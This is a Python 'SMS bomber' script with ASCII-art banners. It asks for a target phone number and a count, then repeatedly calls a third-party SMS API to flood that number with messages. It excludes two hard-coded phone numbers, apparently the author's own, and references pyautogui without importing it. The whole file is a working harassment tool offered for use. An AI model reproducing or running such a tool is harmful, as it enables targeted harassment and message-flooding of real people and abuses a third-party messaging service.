import requests
import os
import time
banner='''
    __  __      __      __      ___         __  __           __            
   / / / /___ _/ /___ _/ /     /   |  _____/ / / /___ ______/ /_____  _____
  / /_/ / __ `/ / __ `/ /_____/ /| | / ___/ /_/ / __ `/ ___/ //_/ _ \/ ___/
 / __  / /_/ / / /_/ / /_____/ ___ |(__  ) __  / /_/ / /__/ ,< /  __/ /    
/_/ /_/\__,_/_/\__,_/_/     /_/  |_/____/_/ /_/\__,_/\___/_/|_|\___/_/     
                                                                           
'''
banner2='''
  ____      _        _                     _               
 |  _ \    | |      | |                   | |              
 | |_) | __| |______| |__   ___  _ __ ___ | |__   ___ _ __ 
 |  _ < / _` |______| '_ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |_) | (_| |      | |_) | (_) | | | | | | |_) |  __/ |   
 |____/ \__,_|      |_.__/ \___/|_| |_| |_|_.__/ \___|_|   
                                                           
'''
m='01974162244'
m2='01618609573'
banner3='''                                                                                  
                                ██████████                                          
                              ██░░░░████████                                        
                              ░░▓▓▓▓░░░░░░████                                      
                              ████████      ██                                      
                            ██▒▒▒▒▒▒▒▒██                                            
                          ██▒▒▒▒▒▒▒▒▒▒▒▒██                                          
                          ██▒▒▒▒▒▒▒▒▒▒▒▒██                                          
                          ██▒▒▒▒▒▒▒▒▒▒▒▒██                                          
                            ██▒▒▒▒▒▒▒▒██                                            
                            ░░▓▓▓▓▓▓▓▓░░                                            
'''

os.system('clear')
print(banner)
print("1) start bd bomber")
print("2) exit")
y=int(input("=>"))
if y==1:
    os.system('clear')
    print(banner2)
    n =str(input("Enter Your Target Number: "))
    a = int(input("Enter Your Amount: "))
    if n == m or n == m2:
        print('Tray another number.')
        time.sleep(2)
        pyautogui.press('up')
        pyautogui.press('enter')
        pyautogui.press('1')
        pyautogui.press('enter')

    else:
        os.system('clear')
        print(banner3)
        print('--------------------------------------------------------------------------------------------------------------------------------------')
        print('Tanget number is ',n)
        print('Amount is ',a)
        print('wait..................')
        for x in range(a):

          response = requests.get("http://deepitsolution.in/api.php?number=" + n)
          if response.ok:
              print(f"message {x+1} send successful.....")
          else:
              print(f"message {x+1} failed......")
elif y==2:
    os.system('exit')
print('Thank for use..........')
